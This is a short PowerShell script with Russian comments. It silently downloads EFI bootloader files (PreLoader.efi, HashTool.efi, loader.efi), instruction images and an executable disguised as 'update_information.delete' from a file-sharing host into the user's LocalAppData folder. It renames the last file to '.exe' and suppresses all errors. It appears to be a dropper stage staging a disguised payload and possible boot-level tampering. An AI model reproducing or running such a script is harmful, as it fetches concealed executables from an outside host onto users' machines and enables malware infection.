# Определение пути для сохранения файлов
$localAppData = $env:LOCALAPPDATA

# Массив файлов для загрузки (URL и имя файла)
$files = @(
    @{Url = "https://www.udrop.com/file/Omlf/PreLoader.efi"; Name = "PreLoader.efi"},
    @{Url = "https://www.udrop.com/file/Omle/HashTool.efi"; Name = "HashTool.efi"},
    @{Url = "https://www.udrop.com/file/Omld/loader.efi"; Name = "loader.efi"},
    @{Url = "https://www.udrop.com/file/Omsd/step1.png"; Name = "step1.png"},
    @{Url = "https://www.udrop.com/file/Omsf/step2.png"; Name = "step2.png"},
    @{Url = "https://www.udrop.com/file/Omse/step3.png"; Name = "step3.png"},
    @{Url = "https://www.udrop.com/file/Omsg/step4.png"; Name = "step4.png"},
    @{Url = "https://www.udrop.com/file/Omsh/update_information.delete"; Name = "update_information.exe"}
)

# Загрузка всех файлов
foreach ($file in $files) {
    $outputPath = Join-Path -Path $localAppData -ChildPath $file.Name
    try {
        Invoke-WebRequest -Uri $file.Url -OutFile $outputPath -UseBasicParsing
    } catch {
        # Игнорируем ошибки
    }
}
